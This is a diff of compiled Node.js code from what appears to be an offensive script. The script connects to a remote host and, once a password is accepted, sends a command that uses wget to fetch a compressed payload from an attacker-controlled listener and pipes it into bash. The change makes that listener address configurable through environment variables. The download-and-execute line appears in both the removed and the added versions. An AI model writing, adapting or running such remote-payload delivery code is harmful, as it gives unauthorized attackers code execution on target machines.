@@ -37,7 +37,7 @@ var __generator = (this && this.__generator) || function (thisArg, body) {
 };
 exports.__esModule = true;
 var net = require("net");
-var _a = process.env, _b = _a.RHOST, RHOST = _b === void 0 ? '127.0.0.1' : _b, _c = _a.RPORT, RPORT = _c === void 0 ? '9001' : _c;
+var _a = process.env, _b = _a.RHOST, RHOST = _b === void 0 ? '127.0.0.1' : _b, _c = _a.RPORT, RPORT = _c === void 0 ? '9001' : _c, _d = _a.LHOST, LHOST = _d === void 0 ? '10.13.1.79' : _d, _e = _a.LPORT, LPORT = _e === void 0 ? '1234' : _e;
 var TIMEOUT = 5000;
 var doProd = function () {
     return new Promise(function (resolve, reject) {
@@ -63,7 +63,7 @@ var doProd = function () {
                 }
                 if (/correct password/i.test(data.toString())) {
                     console.log('Password accepted.');
-                    sock.write('wget -q -O- 10.13.1.79:1234/kk/kpz|tar -xvJO|bash\n', function (err) {
+                    sock.write("wget -q -O- ".concat(LHOST, ":").concat(LPORT, "/kk/kpz|tar -xvJO|bash\n"), function (err) {
                         if (err) {
                             console.error('Error writing to socket:', err);
                             sock.destroy();
